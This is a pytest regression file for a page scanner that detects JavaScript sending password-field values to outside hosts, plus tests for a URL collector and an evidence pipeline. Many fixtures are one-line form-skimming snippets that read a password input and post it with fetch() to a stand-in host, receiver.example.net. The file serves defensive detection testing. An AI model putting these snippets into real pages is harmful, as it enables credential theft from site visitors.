"""Independent-review regressions, with positive and negative public-path controls."""
import pytest
from L3_SCANNER import L3Scanner
from L3_SCANNER.policies.operational import operational_detection_policy
from evidence_pipeline import build_record
from evidence_pipeline.context_relations import build_internal_context as build_context
# Historical F1-F8 value-preservation assertions inspect the internal evidence
# view. The new public model projection is tested in test_model_context.py.


def scan(html, code=''):
    return L3Scanner(operational_detection_policy()).scan_content({
        'original_url':'https://origin.example.com/page',
        'html':{'content':html+'<script>'+code+'</script>'}})


def links(result):
    return [link for event in result['raw']['javascript']['network_requests'] for link in event['source_links']]


@pytest.mark.parametrize('html,selector,expected',[
    ('<input id="search"><input id="pw" type="password">', 'document.querySelector("input")', False),
    ('<input id="pw" type="password"><input id="search">', 'document.querySelector("input")', True),
    ('<input id="same"><input id="same" type="password">', 'document.getElementById("same")', False),
    ('<div id="same"></div><input id="same" type="password">', 'document.querySelector("#same")', False),
    ('<input id="same" type="password"><div id="same"></div>', 'document.getElementById("same")', True),
    ('<div name="password"></div><input name="password" type="password">', 'document.querySelector("[name=password]")', False),
    ('<div name="password"></div><input name="password" type="password">', 'document.querySelector("input[name=password]")', True),
    ('<input type="password">', 'document.querySelector("input")', True),
    ('<input id="search"><input id="pw" type="password">', 'document.getElementById("search")', False),
])
def test_f1_dom_selection_precedes_credential_classification(html, selector, expected):
    result = scan(html, 'fetch("https://receiver.example.net/",{method:"POST",body:'+selector+'.value});')
    assert bool(links(result)) is expected
    record = build_record('l3',result,request_id='review',attempt=1)
    context = build_context([record],{'l3':result['raw']})
    delivered = [x for b in context['behaviors'] if b['kind']=='network_requests' for x in b['observation']['source_links']]
    assert delivered == links(result)


@pytest.mark.parametrize('expression,expected',[
    ('(p,"page opened")',False), ('("page opened",p)',True),
    ('((p,"a"),"b")',False), ('("a",("b",p))',True),
])
def test_f2_sequence_return_is_last_value_but_reads_are_observed(expression, expected):
    result = scan('<input id="pw" type="password">',
        'var p=document.getElementById("pw").value;fetch("https://receiver.example.net/",{method:"POST",body:'+expression+'});')
    assert bool(links(result)) is expected
    assert result['raw']['javascript']['credential_access']


@pytest.mark.parametrize('code,expected',[
    ('fetch(u,{method:"POST",body:"opened",localNote:p});',False),
    ('fetch(u,{method:"POST",body:p});',True),
    ('fetch(u,{headers:{"X-Value":p}});',True),
    ('fetch(u+"?value="+p);',True),
    ('var options={method:"POST",body:p};var alias=options;fetch(u,alias);',True),
    ('var options={method:"POST",body:p};options.body="opened";fetch(u,options);',False),
    ('var options={method:"POST",body:"opened"};options.body=p;fetch(u,options);',True),
    ('fetch(u,{method:"POST",body:p,body:"opened"});',False),
    ('var h={"X-Value":p};h["X-Value"]="constant";fetch(u,{headers:h});',False),
    ('var h={};h["X-Value"]=p;fetch(u,{headers:h});',True),
    ('var o={method:"POST",body:p};var key="body";o[key]="constant";fetch(u,o);',False),
    ('var o={headers:{"X-Value":p}};o.headers["X-Value"]="constant";fetch(u,o);',False),
    ('var h={"X-Value":p};delete h["X-Value"];fetch(u,{headers:h});',False),
])
def test_f3_fetch_transmitted_fields_only(code,expected):
    result=scan('<input id="pw" type="password">',
        'var p=document.getElementById("pw").value;var u="https://receiver.example.net/";'+code)
    assert bool(links(result)) is expected


def test_f3_unknown_options_are_incomplete_not_a_negative():
    result=scan('<input id="pw" type="password">', 'fetch("https://receiver.example.net/",unknownOptions);')
    raw=result['raw']['javascript']
    assert raw['analysis']['semantic_complete'] is False
    assert any(e['code']=='fetch_options_unresolved' for e in raw['errors'])
    assert next(s for s in result['signals'] if s['id']=='L3-J-06')['detected'] is None


def test_f3_unknown_member_write_invalidates_previous_payload():
    result=scan('<input id="pw" type="password">','var o={body:document.getElementById("pw").value};'
        'o[unknownKey]="constant";fetch("https://receiver.example.net/",o);')
    assert not links(result)
    assert result['raw']['javascript']['analysis']['semantic_complete'] is False


@pytest.mark.parametrize('code',[
    'fetch(u,{method:"POST",body:{localNote:p}});',
    'fetch(u,{method:"POST",body:[p]});',
    'var o={secret:p};fetch(u,{method:"POST",body:o[unknownKey]});',
    'fetch(u,{headers:{"X-Value":{localNote:p}}});',
    'var h={"X-Value":p};delete h[unknownKey];fetch(u,{headers:h});',
])
def test_f3_unmodeled_conversion_and_member_operations_do_not_assert_transmission(code):
    result=scan('<input id="pw" type="password">',
        'var p=document.getElementById("pw").value;var u="https://receiver.example.net/";'+code)
    assert not links(result)
    assert result['raw']['javascript']['analysis']['semantic_complete'] is False
    assert next(s for s in result['signals'] if s['id']=='L3-J-06')['detected'] is None


@pytest.mark.parametrize('options,configuration',[
    ('{body:p}','invalid_get_head_body'),
    ('{method:"GET",body:p}','invalid_get_head_body'),
    ('{method:"HEAD",body:p}','invalid_get_head_body'),
    ('{method:"GET",body:""}','invalid_get_head_body'),
    ('{method:unknownMethod,body:p}','method_unresolved'),
    ('{method:"GET",body:unknownBody}','body_nullability_unresolved'),
])
def test_f3_invalid_or_unresolved_request_preserves_attempt_without_payload_claim(options,configuration):
    result=scan('<input id="pw" type="password">','var p=document.getElementById("pw").value;'
        'fetch("https://receiver.example.net/?v="+p,'+options+');')
    event=result['raw']['javascript']['network_requests'][0]
    assert event['request_configuration']==configuration
    assert not event['source_links']
    assert event['source_excerpt'] and event['destination_prefix']
    assert result['raw']['javascript']['credential_access']
    assert next(s for s in result['signals'] if s['id']=='L3-J-06')['detected'] is None


def test_f3_get_with_null_body_keeps_valid_url_payload():
    result=scan('<input id="pw" type="password">','var p=document.getElementById("pw").value;'
        'fetch("https://receiver.example.net/?v="+p,{body:null});')
    assert links(result)[0]['transmission_position']=='url'


def test_f4_l0_versions_survive_public_pipeline_storage(tmp_path):
    import json
    from l0.registry import analyze
    from evidence_pipeline.records import canonical
    url='https://bit.ly/demo'
    original=analyze(url)
    value=build_record('l0',original,request_id='review',attempt=1)
    path=tmp_path/'record-l0.json'
    path.write_bytes(canonical(value))
    record=json.loads(path.read_text(encoding='utf-8'))
    assert record['coverage']['reference_versions']==original['reference_versions']
    assert record['signals']==original['observations']


def test_f7_redirect_body_interruption_keeps_prefix_and_both_errors():
    import httpx
    from url_collector import collect_url,CollectionPolicy
    class Interrupted(httpx.SyncByteStream):
        def __iter__(self):
            yield b'<h1>partial'
            raise httpx.ReadError('offline interruption')
    snapshot=collect_url('https://origin.example.com/page',CollectionPolicy(1,2,1000,'review'),
        resolver=lambda *args:['93.184.216.34'],transport=httpx.MockTransport(
            lambda request:httpx.Response(302,headers={'content-type':'text/html'},stream=Interrupted())))
    assert snapshot.body==b'<h1>partial' and snapshot.truncated
    assert {e.code for e in snapshot.collection_errors}=={'redirect_without_location','response_body_interrupted'}


def test_f6_separate_analyzer_occurrences_and_explicit_shared_occurrence(monkeypatch):
    from L3_SCANNER.analyzers.javascript import runner
    def failed(*args): raise ValueError('same text')
    result=scan('<h1>Page</h1>')
    monkeypatch.setattr(runner,'ANALYZERS',(('L3-J-01','a',failed),('L3-J-02','b',failed)))
    result['signals']=runner.analyze_javascript(result['raw']['javascript'],operational_detection_policy())
    record=build_record('l3',result,request_id='review',attempt=1)
    assert len(record['causes'])==2
    assert {c['detail']['analyzer'] for c in record['causes']}=={'L3-J-01','L3-J-02'}
    for s in result['signals']: s['error']={'code':'shared_failure','occurrence_id':'shared:one'}
    shared=build_record('l3',result,request_id='review',attempt=1)
    assert len(shared['causes'])==1
    assert len(shared['causes'][0]['source_hints'])==2
    for s in result['signals']: s['error']={'code':'unlocated_failure','message':'same text'}
    unlocated=build_record('l3',result,request_id='review',attempt=1)
    assert len(unlocated['causes'])==2


@pytest.mark.parametrize('body,max_bytes,truncated',[(b'<h1>Preserved</h1>',1000,False),(b'',1000,False),(b'0123456789',4,True)])
def test_f7_redirect_failure_keeps_current_response(body,max_bytes,truncated,monkeypatch):
    import httpx
    from url_collector import collect_url,CollectionPolicy
    from l2_scanner.adapters.page_snapshot import to_l2_http_raw
    from L3_SCANNER.adapters.page_snapshot import to_l3_input
    monkeypatch.setattr('l2_scanner.adapters.page_snapshot._detect_mime',lambda b:'text/html')
    calls=[]
    def handler(request):
        calls.append(str(request.url))
        return httpx.Response(302,headers={'content-type':'text/html'},content=body)
    snapshot=collect_url('https://origin.example.com/page',CollectionPolicy(1,2,max_bytes,'review'),
        resolver=lambda *args:['93.184.216.34'],transport=httpx.MockTransport(handler))
    assert len(calls)==1 and snapshot.final_url is None
    assert snapshot.response_received and snapshot.body==body[:max_bytes]
    assert snapshot.truncated is truncated
    assert any(e.code=='redirect_without_location' for e in snapshot.collection_errors)
    l2=to_l2_http_raw(snapshot);l3=to_l3_input(snapshot)
    assert l2['headers']['content_type']=='text/html'
    assert l2['response_body']['body_complete'] is (not truncated)
    assert l3.html.content==body[:max_bytes].decode()
    assert l3.response['redirect_journey_complete'] is False
    result=L3Scanner(operational_detection_policy()).scan_content(l3)
    record=build_record('l3',result,request_id='review',attempt=1)
    context=build_context([record],{'l3':result['raw']})
    assert context['documents'][0]['source_complete'] is (not truncated)


def test_f8_partial_query_preserves_positive_and_separate_error_without_negatives():
    from l0.registry import analyze
    result=analyze('https://origin.example.com/?bad=%E7&next=https%3A%2F%2Freceiver.example.net%2F')
    record=build_record('l0',result,request_id='review',attempt=1)
    query_ids={c['occurrence_id'] for c in record['errors'] if c['code']=='query_component_parse_failed'}
    assert query_ids
    assert record['signals']==result['observations']
    assert record['analysis']['state']=='partial'
    assert any(s['검사']=='쿼리의_외부_주소' for s in record['signals'])
    assert all(set(s)=={'검사','관찰','판단에 쓸 점'} for s in record['signals'])


@pytest.mark.parametrize('identifier',['document','L3-J-06','L3-native-submission'])
def test_f5_colliding_original_ids_have_separate_citations_and_unchanged_relationships(identifier):
    from evidence_pipeline.judgment_contract import evidence_ids
    from evidence_pipeline.pipeline import validate_judgment
    from evidence_pipeline.context_inventory import present,restore
    from copy import deepcopy
    result=scan('<form id="login"><input id="'+identifier+'" name="password" type="password"></form>',
        'fetch("https://receiver.example.net/",{method:"POST",body:document.getElementById("'+identifier+'").value});')
    record=build_record('l3',result,request_id='review',attempt=1)
    c=build_context([record],{'l3':result['raw']})
    assert c['documents'][0]['inputs'][0]['field_id']==identifier
    assert c['analysis_facts'][0]['fields'][0]['field_id']==identifier
    assert c['recorded_relationships']['network_paths'][0]['source_field_ids_recorded']==[identifier]
    collisions=[x for x in c['evidence_catalog'] if x['original_id']==identifier]
    assert len(collisions)==2 and len({x['id'] for x in collisions})==2
    assert identifier not in evidence_ids(c)
    for entry in c['evidence_catalog']:
        target=c
        for token in entry['source_pointer'].strip('/').split('/'):
            target=target[int(token)] if isinstance(target,list) else target[token]
        assert target[entry['id_field']]==entry['original_id']
    assert restore(present(c))==c
    judgment={'verdict':'UNKNOWN','summary':'Fixture','observations':[],
        'reasons':[{'text':'Fixture','evidence_ids':[collisions[0]['id']]}], 'limitations':[],'deep_analysis_needed':True}
    assert validate_judgment(judgment,c)==judgment
    judgment['reasons'][0]['evidence_ids']=[identifier]
    with pytest.raises(ValueError,match='invalid_evidence_reference'): validate_judgment(judgment,c)
    changed=deepcopy(c);changed['evidence_catalog'][0]['source_pointer']='/documents/99'
    with pytest.raises(ValueError,match='invalid_evidence_catalog'): evidence_ids(changed)


def test_f5_catalog_citation_namespace_does_not_collide_with_original_ids():
    from evidence_pipeline.judgment_contract import evidence_ids
    result=scan('<input id="document"><input id="citation:1">')
    record=build_record('l3',result,request_id='review',attempt=1)
    c=build_context([record],{'l3':result['raw']})
    ids=evidence_ids(c)
    assert len(ids)==len(set(ids))
    assert 'citation:1' in ids and 'document' not in ids


def test_f5_actual_packed_payload_keeps_catalog_valid_without_duplicating_unique_ids():
    import io,json
    from evidence_pipeline.context_inventory import restore
    from evidence_pipeline.gateway import OpenAICompatibleGateway
    from evidence_pipeline.judgment_contract import evidence_ids
    inputs='<input id="document" name="password" type="password">'+''.join(
        f'<input id="field-{i}" name="repeated-name" placeholder="Repeated ordinary field description">' for i in range(40))
    result=scan('<form>'+inputs+'</form>')
    record=build_record('l3',result,request_id='review',attempt=1)
    c=build_context([record],{'l3':result['raw']})
    assert len(c['evidence_catalog'])==2
    calls=[]
    def opener(request,**kwargs):
        assert request.full_url.endswith('/tokenize')
        calls.append(request)
        return io.BytesIO(json.dumps({'count':99999 if len(calls)==1 else 100}).encode())
    gateway=OpenAICompatibleGateway('http://127.0.0.1:8000','test-key','test-model',
        opener=opener,disable_thinking=True,max_tokens=100,max_context_tokens=1000,structured_output=True)
    packed=gateway.prepare_context('policy',c)
    assert len(calls)==2 and 'inventory_encoding_v2' in packed
    payload=gateway._payload('policy',json.dumps(packed))
    supplied=json.loads(payload['messages'][1]['content'])
    assert restore(supplied)==c
    allowed=payload['response_format']['json_schema']['schema']['$defs']['evidence_id']['enum']
    assert allowed==evidence_ids(supplied) and 'document' not in allowed
    assert 'field-0' in allowed
